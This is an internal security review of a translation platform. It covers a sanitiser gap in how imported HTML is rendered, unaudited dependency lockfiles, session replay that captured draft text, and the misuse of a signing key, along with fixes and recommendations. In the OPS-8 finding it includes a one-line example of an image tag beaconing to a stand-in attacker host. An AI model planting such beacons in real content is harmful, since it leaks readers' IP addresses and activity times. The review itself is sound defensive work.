# Operational Security Review — 2026-08-13

_Third pass in the standing series. Follows `docs/OPSEC-REVIEW-2026-08-10.md`
(OPS-1…OPS-7) and `docs/OPSEC.md` (2026-08-06, V1…V9), which in turn re-check
`docs/SECURITY-NOTES-2026-06-10.md` (SEC-1…SEC-11). New findings here continue
the **OPS-n** series at OPS-8._

Every finding is labelled **FACT** (verified against a file:line or a command
run at this commit) or **JUDGMENT** (reasoned inference). Findings fixed in the
same change that adds this document say so; the rest carry a recommended owner
decision, because they are secrets or settings calls rather than patches.

**What this pass turned up that the previous two did not:** the two highest-value
findings both came from *widening the aperture rather than looking harder*. OPS-8
came from asking what an imported file can do rather than what an attacker with an
account can do. OPS-9 came from pointing the dependency audit at the lockfiles
nobody had pointed it at. Both were sitting in code the last two reviews read.

---

## 1. Critical data

Unchanged in substance from the 2026-08-10 ranking, which stands. Restated only
where this pass touches it:

| Rank | Asset | Where it lives | Why it matters |
|---|---|---|---|
| 1 | **Translator identity ↔ project linkage** | `users`, `project_members`, invite emails, comment authorship — and, newly relevant, *any outbound request a translator's browser can be made to issue* | Some teams do this work where it is legally or socially dangerous. "Who is translating what, with whom, at what hour" is the datum the platform can never un-leak. OPS-8 is a disclosure path for exactly this that involves no account and no credential. |
| 2 | **Signing keys** — `SECRET_KEY`, `SYNC_SECRET_KEY` | Worker secrets | Mint tokens for any user/project. `SYNC_SECRET_KEY` additionally serves as a plaintext admin bearer (OPS-2). |
| 3 | **Session JWTs** | Browser IndexedDB, 30-day lifetime | Script-readable; the CSP is still mostly report-only. |
| 4 | **Unpublished translation content** | `events` / `cells`, R2 blobs — **and PostHog session replays** | OPS-3: replay captured the editor verbatim, because a contenteditable is not an `<input>`. |
| 5–9 | Voice recordings; credentials at rest; platform third-party keys; auth telemetry; analytics | unchanged | See the 2026-08-10 table. |

---

## 2. Threats

The 2026-08-10 actor table stands. One row is re-weighted by OPS-8:

| Actor | What changed |
|---|---|
| **State or non-state actor hostile to the translation work** | Previously reasoned about as needing an account, a token, or a project-scope bug. OPS-8 shows a cheaper route: get a document imported. A file is a normal thing to send a translation team — from a partner organisation, a consultant, a denomination, a downloaded resource — and it needs no access to our systems at all. That collapses the cost of the highest-impact attack in the model from "compromise something" to "send an attachment". |
| Supply-chain attacker | Unchanged in kind, better instrumented: OPS-6 closes the detection gap, and the production trees are now at zero known advisories rather than nine. |
| Phishers targeting maintainers | Unchanged, still the likeliest targeted actor, still entirely outside this repo's controls. §5 operator practices. |

---

## 3. Vulnerabilities

### OPS-8 — [FACT] Imported HTML rendered under DOMPurify's defaults, so a source document could beacon every translator's IP and working hours — **fixed in this change**

`SanitizedRichHtml` (`src/components/EditorTable.tsx`) rendered `cell.originalHtml`
through `DOMPurify.sanitize(html)` with **no config**. DOMPurify's defaults are an
XSS filter, not a content policy: they strip scripts and event handlers and keep
`<img src>`, `<a href>`, `<video>`, `<audio>`, `<source>`, `<svg><image href>`.

That would be inert if only trusted markup reached the field. It does not:
`extractHtmlStrings` stores an imported block's **`innerHTML` verbatim**
(`src/lib/parsers/html.ts:112`), and its own comment says so — "Keep inline
markup (`<strong>`, `<a>`, …)". `originalHtml` is a client-supplied field on a
`source.cell.create` event, and no server-side sanitisation exists (verified: no
`sanitize` of cell HTML anywhere in `sync-worker/src`).

So an HTML document imported into a project could contain
`<img src="https://attacker.example/1.gif">`, and every project member's browser
would fetch that URL the moment the cell rendered. The disclosure is IP address,
user agent, and the precise minute a specific person was reading a specific
passage — repeated per cell, which makes it a working-hours and reading-order
trace, not a single ping. Against §2's fourth actor that is not a side channel;
it is the target datum. `<a href>` in the same field additionally puts an
attacker-chosen clickable link inside the surface translators are told to trust.

Three things made this survive two prior reviews:

- **It is not XSS**, so it did not look like a sanitiser bug. The `SECURITY`
  comment above the call site (`EditorTable.tsx`, above `EditorRow`) is correct about the risk
  it was reasoning about — "DOMPurify provides defense-in-depth against XSS" —
  and simply was not asking the other question.
- **The target side was already right.** `prepareReadOnlyRichTextHtml` →
  `sanitizeEditorHtml` has always used an explicit allowlist. The asymmetry
  between the two columns was the tell, and it is only visible if you read both.
- **The CSP would not have caught it.** `img-src 'self' data: blob: https:` in
  the report-only policy permits any HTTPS host, so promoting the CSP as-is
  would not close this. (Follow-up: narrow `img-src`/`connect-src` to a real host
  list — recommendation 3 in §5.)

**Fixed:** new `sanitizeSourceDisplayHtml` (`src/lib/richtext/editor-content.ts`)
applies the same allowlist the target surface uses. Round-trip export is
unaffected — `exportHtml` re-parses the original uploaded document, not this
field — and the allowlist is a superset of what every parser emits
(`markdown.ts` produces `<b>/<i>/<s>/<code>`; docx/pptx add `<u>/<strong>/<em>/<span>`).
The one deliberate behaviour change is that a link in an imported HTML file now
displays as its text rather than as a link, which matches how the target column
has always behaved.

> **Test-environment caveat, recorded because it will trip up the next person.**
> Under happy-dom, DOMPurify's DOM walk does not reproduce browser behaviour: it
> drops `<p>`, `<span>` and any element carrying an attribute, and it produces
> *identical* output for the default and the allowlisted config. An
> output-based unit test therefore passes against the vulnerable code — the
> first draft of the test for this fix did exactly that. The committed test
> asserts the sanitiser's **configuration** instead (explicit allowlist, no
> URL-bearing tag or attribute, parity with the target surface), which is
> environment-independent and is what actually went wrong. Real output belongs
> in an E2E assertion against a browser; that is not written yet and is listed
> in §5.

### OPS-9 — [FACT] No audit ever covered the Workers' lockfiles, and three `hono` advisories were sitting in auth-worker — **fixed in this change**

The repo has four lockfiles: the root SPA plus `auth-worker`, `sync-worker` and
`agent-worker`, each resolving independently. Every dependency check in the
series so far — June's SEC-7, the 2026-08-06 V6, the 2026-08-10 OPS-6 — ran
`pnpm audit` at the root, which sees the SPA and none of the Workers. The three
packages holding the signing keys, the token issuer, and the sandbox were the
part nothing audited.

Pointing the new `pnpm audit:deps` at all four on its first run turned up three
`hono` advisories in `auth-worker` at declared `^4.12.21`, all fixed in 4.12.34:
a CORS-middleware ReDoS, a Proxy-Helper `Connection`-header leak, and — the one
that matters — **`memo()` retaining SSR output across requests, i.e. cross-user
data disclosure**. `agent-worker` carried the same declared floor. This is the
third consecutive review in which `hono`'s declared floor has been the finding,
which is worth noticing on its own: the floor keeps being raised to the advisory
of the day and then goes stale, because nothing was watching between reviews.

**Fixed:** `hono` floor raised to `^4.12.34` in auth-worker and agent-worker,
both lockfiles updated (`sync-worker` was already on `^4.13.1`). All four
lockfiles now audit clean.

### OPS-3 — [FACT] Session replay captured the editor verbatim; `maskAllInputs` never covered it — **fixed in this change**

Carried from 2026-08-10, now closed. `maskAllInputs: true` reads like it covers
user content and does not: the cell editor is a TipTap **contenteditable**, not
an `<input>`, and the source column beside it is plain rendered DOM. The
`maskTextSelector: "[data-ph-mask]"` escape hatch existed but **no element in
the entire codebase used it** — verified by grep; the selector matched nothing.
So the single surface whose disclosure matters most — which passage a named
person is editing, and what they have written — was the one surface replay
recorded in full, and shipped to a US processor.

Consent-gating and `opt_out_capturing_by_default` are the right shape and were
doing real work here; this is about what happens *after* someone opts in, on the
reasonable belief that "analytics" does not mean "video of my draft".

**Fixed:** the mask selector is now `"[data-ph-mask], [data-cell-type]"`.
`[data-cell-type]` is the source and target column wrappers in `EditorTable`, so
one selector covers every render variant — rich HTML, plain, USFM, IDML, and the
live editor — instead of one component at a time. Comment bodies
(`CommentThread`, `CommentsPage`) opt in explicitly, since a comment quotes the
draft. `src/lib/posthog-replay-masking.test.ts` ties the selector to the markup
across files so neither half can drift away from the other.

### OPS-6 — [FACT] Nothing watched dependencies between reviews — **fixed in this change**

Also carried from 2026-08-10. `pnpm audit --prod` at the root reported **9
advisories: 1 critical, 3 high, 5 moderate** — `tar` (×4, transitive via
`kokoro-js → @huggingface/transformers → onnxruntime-node`), `sharp`, `adm-zip`,
and `dompurify` ≤3.4.12. Note the shape of that list: `react-router`, flagged in
the 2026-08-06 pass, had resolved itself through ordinary version drift. That is
the failure mode — advisories arriving and leaving unobserved, and the review
cadence deciding what gets noticed.

The `dompurify` advisory is *not* exploitable here (it requires `IN_PLACE` mode
or a hook; this codebase uses neither — verified), but it is the sanitiser
standing between imported documents and every translator's browser, which is
not a dependency to run one patch behind on principle.

**Fixed:**
- `pnpm.overrides` for the three transitive advisories (`tar >=7.5.21`,
  `adm-zip >=0.6.0`, `sharp >=0.35.0` — all Node-only paths; the browser build
  uses `onnxruntime-web`), and `dompurify` raised to `^3.4.13`.
- `pnpm audit:deps` (`scripts/audit-deps.ts`) audits **all four lockfiles**, and
  fails when an audit reports an implausibly small dependency count — so a
  mis-scoped run reads as "did not run", not as "clean". That guard is not
  hypothetical: running `pnpm audit` from a subdirectory during this review
  reported "No known vulnerabilities found" against six packages, exit 0, which
  is precisely how a green check comes to mean nothing.
- `.github/workflows/dependency-audit.yml` runs it weekly and, on failure,
  files or updates one tracking issue — because a red scheduled workflow
  notifies nobody who is not already watching Actions.

**Result: all four lockfiles are at zero known advisories**, down from nine. A
clean baseline is what makes a strict gate affordable; the previous review's
reasoning against a *per-PR* audit (it goes red on tooling the author cannot fix,
and trains people to override checks) still holds, which is why this is weekly
and production-only.

### OPS-2 — [FACT] The signing key travelled through operator shells — **partially addressed in this change**

Carried from 2026-08-10 (and SEC-5 before it). Every `/admin/*` and `/migrate/*`
route on sync-worker gated on `Authorization: Bearer ${SYNC_SECRET_KEY}` — the
*token-signing key*. Running an R2 cleanup or an FTS rebuild therefore put the
key that mints sync tokens for every project into a shell history, a terminal
scrollback, and any intermediary that logs. The code was fine; the credential
was wrong.

The previous review deferred this as needing secrets provisioned "in the right
order, to avoid locking out ops". The ordering problem is real and this change
does not pretend otherwise — around twenty verification sites and a dozen
service-to-service callers depend on that value. What it does is remove the
ordering problem:

**Fixed (partially):** `sync-worker/src/lib/admin-auth.ts` accepts a dedicated
`ADMIN_SECRET` **or** `SYNC_SECRET_KEY`, applied to the fourteen
operator-facing route handlers (`admin.ts`, `rebuild`, `rebuild-fts`, and the `migrate-*` family).
Service-to-service callers are untouched and keep sending `SYNC_SECRET_KEY`, so
provisioning `ADMIN_SECRET` cannot lock anyone out in any order, on any
environment, with or without a deploy. `pnpm admin:request` reads the secret
from the environment and refuses to accept it as an argument, so there is no
invocation that leaks it.

**Not closed.** The signing key remains a valid admin bearer until the
`SYNC_SECRET_KEY` branch in `admin-auth.ts` is deleted, which needs the
service-to-service callers moved to their own credential first. That is a
one-line change behind one migration — see §5.

### OPS-10 — [FACT structure / JUDGMENT impact] `sync-token` still auto-registers any unknown project ID with the caller as OWNER

SEC-9, re-verified and still open. `auth-worker/src/routes/sync-token.ts:98-111`:
when a token is requested for a `projectId` that does not exist and a
`projectName` is supplied, the row is inserted and the caller is granted OWNER.
The project ID is client-chosen.

The practical exposure is low — IDs are client-generated UUIDs, so guessing one
before its owner mints a token is not a realistic race — but it means any
authenticated user can create unbounded projects outside every org quota,
entitlement and admin surface, by asking for a token. **Not fixed here:** the
import bootstrap depends on this path, and changing it unattended risks breaking
project creation for a finding whose realistic impact is resource abuse. It
wants a deliberate change that keeps the bootstrap and adds the quota check.

### Observation — [FACT run status / cause UNVERIFIED] two scheduled Actions workflows are failing

Noted while confirming that a scheduled workflow is a real control before adding
one. Actions **is** executing scheduled runs (so `dependency-audit.yml` will
run — V4a's 2026-08-06 condition is genuinely resolved). But `Refresh Dev Neon
Branch` concluded `failure` on both its 2026-08-13 runs, and `Delta sync (content
+ audio)` failed the same morning. Dependabot runs in the same window succeeded,
so this is not a wholesale Actions outage.

Not investigated — out of scope for an OPSEC pass, and the cause is not verified
from here. Recorded because "a scheduled job that has been quietly failing" is
the same failure class as V4 and OPS-4, and someone should look.

---

## 4. Risk assessment

Likelihood over roughly the next year, assuming current practices.

| ID | Vulnerability | Likelihood | Impact | Risk | State |
|---|---|---|---|---|---|
| SEC-1 / V7 | Prod and dev share `SECRET_KEY` / `SYNC_SECRET_KEY` | Low | **Critical** — mints any credential | **High** | **Open — still the top item** |
| OPS-8 | Imported HTML could beacon translator IP + working hours | Medium — needs only a file, no access | **Severe** for a team in a hostile jurisdiction; low elsewhere | **High** | Fixed |
| OPS-9 | Worker lockfiles never audited; `hono` cross-user disclosure | Was certain (it had already happened) | High — cross-user data disclosure in the identity Worker | **High** | Fixed |
| OPS-2 | Signing key as admin bearer | Medium — one careless paste | **Critical** — mints tokens for any project | **High** | Partially addressed |
| OPS-3 | Replay captured draft text and passage identity | Certain — designed behaviour | Low normally; **severe** for a restricted-context team | **Medium-High** | Fixed |
| OPS-6 | Nothing watched dependencies between reviews | Certain | Medium-High | **Medium** | Fixed |
| OPS-1 / V2 | CSP still mostly report-only | Medium | High — one XSS ⇒ 30-day token + user API keys | **Medium** | Partial |
| SEC-2 / V8 | 30-day access tokens | Medium | High | **Medium** | Partial (revocation exists) |
| OPS-10 / SEC-9 | Auto-register grants OWNER on an unknown project ID | Low | Low-Medium — quota bypass, resource abuse | **Low-Medium** | Open |

The pattern from the last two reviews holds and is worth stating again, because
it keeps predicting where the next finding will be: **the high-risk rows are not
sophisticated attacks.** One is a documented convenience trade-off (SEC-1), one
a default no one re-examined (OPS-8), one an audit pointed at three of four
lockfiles (OPS-9), one a habit (OPS-2). None required an adversary to be clever.

---

## 5. Countermeasures

### Applied in this change

| Control | Where | Test |
|---|---|---|
| Source cell HTML sanitised under an explicit allowlist, matching the target surface | `src/lib/richtext/editor-content.ts`, `src/components/EditorTable.tsx` | `src/lib/richtext/source-display-sanitizer.test.ts` |
| Session replay masks all cell text and comment bodies | `src/lib/posthog.ts`, `EditorTable`, `CommentThread`, `CommentsPage` | `src/lib/posthog-replay-masking.test.ts` (selector ↔ markup parity) |
| Dedicated `ADMIN_SECRET` for operator routes, with a lockout-proof fallback | `sync-worker/src/lib/admin-auth.ts` + 14 route handlers | `sync-worker/src/__tests__/admin-auth.test.ts` |
| Admin calls without the secret in shell history | `scripts/admin-request.ts` (`pnpm admin:request`) | — |
| Dependency audit across all four lockfiles, failing on a mis-scoped run | `scripts/audit-deps.ts` (`pnpm audit:deps`) | run in CI weekly |
| Weekly audit with an issue-filing failure path | `.github/workflows/dependency-audit.yml` | — |
| Nine advisories closed; `hono` floor raised past the `memo()` disclosure | `package.json` overrides, `auth-worker` + `agent-worker` | `pnpm audit:deps` |

The series convention holds: every control above has a test, or is itself the
test. A control without one is OPS-4 waiting to happen again.

### Recommended next, in order

1. **Split `SECRET_KEY` / `SYNC_SECRET_KEY` per environment (SEC-1).** Third
   review running as the top item. It means a dev-environment compromise mints
   production-valid tokens, and it removes any ability to rotate one environment
   alone. The cross-environment token reuse it buys in testing is precisely the
   property that makes it dangerous; replace it with a dev-only fixture.
2. **Finish OPS-2.** Provision `ADMIN_SECRET` per environment
   (`wrangler secret put ADMIN_SECRET --env <env>` in `sync-worker/`), move the
   auth-worker → sync-worker calls to a dedicated service credential, then
   delete the `SYNC_SECRET_KEY` branch in `admin-auth.ts`. Each step is
   independently safe; the sequencing exists only so no step can lock ops out.
3. **Narrow `img-src` and `connect-src`, then promote the CSP.** OPS-8 is a
   reminder that `img-src … https:` permits every host on the internet, so
   promoting the report-only policy unchanged would not have stopped it. Pin the
   real host list first — it is more valuable than promoting `script-src`.
4. **An E2E assertion that a source cell cannot issue an outbound request.**
   The OPS-8 unit test pins configuration because happy-dom cannot pin
   behaviour. A Playwright spec that imports an HTML file with a remote `<img>`
   and asserts no request leaves the page would test the actual property, in a
   real browser, and would have caught the original bug.
5. **Add the quota check to project auto-registration (OPS-10).**
6. **Shorten the access-token TTL (SEC-2).** Revocation exists now, so 30 days is
   a UX choice rather than a necessity.

### Operator-side practices — still not verifiable from here

Unchanged from 2026-08-10 and repeated because §2 still puts a phished maintainer
ahead of every technical control in this document:

- **Hardware-backed MFA** (not SMS, not TOTP) on Cloudflare, GitHub, Neon,
  OpenRouter and the Apple developer account.
- **A password manager, unique credentials per service**, nothing reused.
- **Compartmentalise the code-signing keys.** `TAURI_SIGNING_PRIVATE_KEY` and
  the Apple/Windows certificates are the only assets that let someone ship
  signed malicious software to users; they should not be reachable from the
  session that reads a PR.
- **Scope `CLOUDFLARE_API_TOKEN` in CI** to the Workers it deploys, not
  account-wide.
- **Treat invite links as credentials** — never in a screenshot, a public
  channel, or a ticket.
- **Never paste a signing key into a shell.** `pnpm admin:request` now makes
  that easy rather than merely advisable.

### Training

Two items, unchanged, plus one this pass adds:

- **Phishing that targets consoles, not inboxes.** The realistic lure is a
  Cloudflare or GitHub "verify your account" page.
- **What the product's data means.** For some projects the sensitive fact is
  *which language is being translated and by whom* — so a screenshot of a
  project list in a public support thread can matter more than the draft text.
- **New: imported files are untrusted input.** OPS-8 is fixed in code, but the
  general lesson is not code-shaped. A document from a partner is an attachment
  from outside, and "we only import from people we know" is the same assurance
  that makes phishing work.

---

## 6. Effectiveness of existing controls

Re-verified against the tree at this commit, not assumed.

### Working, keep

- **`AuthorizedEvent` perimeter** — symbol-branded, ESLint-enforced, single
  construction site. Still the strongest thing in the codebase.
- **Secret scanning** — `pnpm scan:secrets` clean across every tracked file, and
  it rides the enforced Workers Builds lint lane rather than an optional one.
- **`unauthenticatedBypassError`** (V1) — still wired at both the entry point and
  the DO authorization decision (`sync-worker/src/index.ts:234`,
  `environment-guard.ts:49`). The pattern held.
- **PAT handling** — hashed at rest, plaintext once, greppable `aqk_` tag,
  display prefix. Still the model the rest of the system should copy.
- **Security headers + `public/_headers` parity test** — the OPS-7 fix holds;
  the parity test still binds the two surfaces.
- **`WRANGLER_LOCAL` gating** of `/__dev__/*` and `/__test__/reset` — re-checked,
  set only via CLI in `dev-stack.ts` / `e2e-up.ts`, in no wrangler profile.

### Needs adjustment

| Control | Problem | Action |
|---|---|---|
| `DOMPurify.sanitize()` at the source render boundary | Defaults are an XSS filter, not a content policy (OPS-8) | Fixed — explicit allowlist |
| `maskAllInputs` | Never covered the contenteditable that holds the draft; the `[data-ph-mask]` hook was used by nothing (OPS-3) | Fixed — masks the cell wrappers |
| Root-level `pnpm audit` | Saw one of four lockfiles (OPS-9) | Fixed — `pnpm audit:deps` |
| Dependency hygiene | Audited only during reviews like this one | Fixed — weekly schedule with an issue-filing failure path |
| `SYNC_SECRET_KEY` as admin bearer | Signing key in shell history (OPS-2) | Partially fixed — `ADMIN_SECRET` accepted; fallback still open |
| Environment separation | Explicitly defeated for signing keys (SEC-1) | Open — recommendation 1 |
| Report-only CSP | `img-src … https:` would not have blocked OPS-8 | Narrow the host lists before promoting |

### June findings, re-checked

| Finding | Status | Evidence |
|---|---|---|
| SEC-1 — shared signing keys across envs | **Open** | `auth-worker/wrangler.toml:256` still documents the shared-key intent. Top item for the third review running. |
| SEC-2 — 30-day tokens, no revocation | **Substantially fixed** | `jti` denylist + server-side logout. TTL unchanged; now a UX call. |
| SEC-3 — unbounded LLM proxy | **Fixed** | `creditGuard`/`recordCredit`, model allowlist, per-user and global budgets. |
| SEC-4 — no auth rate limiting | **Fixed** | Covers login, reset, contact, register, admin step-up. |
| SEC-5 — `SYNC_SECRET_KEY` as admin bearer | **Improving** | Constant-time compare since June; `ADMIN_SECRET` accepted as of this change. Carried as OPS-2. |
| SEC-6 — no CSP; script-readable token storage | **Half fixed** | Enforced subset + report-only full policy + `_headers` parity. Storage unchanged. |
| SEC-7 — dependency CVEs | **Fixed, and now watched** | All four lockfiles clean; `hono` floors raised past the `memo()` advisory; weekly audit added (OPS-9, OPS-6). |
| SEC-8 — misleading dev-bypass comment | **Fixed** | Closed 2026-08-10 as OPS-5. |
| SEC-9 — sync-token auto-registers as OWNER | **Open** | `sync-token.ts:98-111` unchanged. Carried as OPS-10. |
| SEC-10 — scrypt work factor | **Open (accepted)** | Legacy byte-compatibility constraint unchanged. |
| SEC-11 — error detail leaked outside production | **Substantially closed** | `auth-worker/src/index.ts:304` returns a generic 500 and logs internally. Two narrow residuals remain: `routes/monday.ts:630` returns `err.message` on a 502, and `migrate-audio-copy-route.ts:97` returns `String(err)` behind the admin gate. Both low-value; recorded rather than fixed. |

**Reading of the trend.** The first two reviews closed the things a control could
catch — headers, CI coverage, credential scanning, revocation, rate limits. This
one closed two things no control was looking for, and both were found by
changing the question rather than by looking harder at the same place. What is
left is almost entirely the class that needs a *secrets or settings decision*:
SEC-1, the rest of OPS-2, the CSP host lists. Those cannot be closed by an
unattended change, and they have now been the recommended next step three
reviews in a row.

## Next review

Whichever comes first: `ADMIN_SECRET` and the per-environment signing keys being
provisioned (verify the fallbacks can be removed, then remove them); the CSP
report-only console coming back clean with narrowed host lists; the first paying
org that self-identifies as working in a restricted context; or three months.

_Re-run the mechanical parts with: `pnpm run scan:secrets`, `pnpm run audit:deps`,
`pnpm run test:worker`, `pnpm test`, and `cd sync-worker && npm test`._
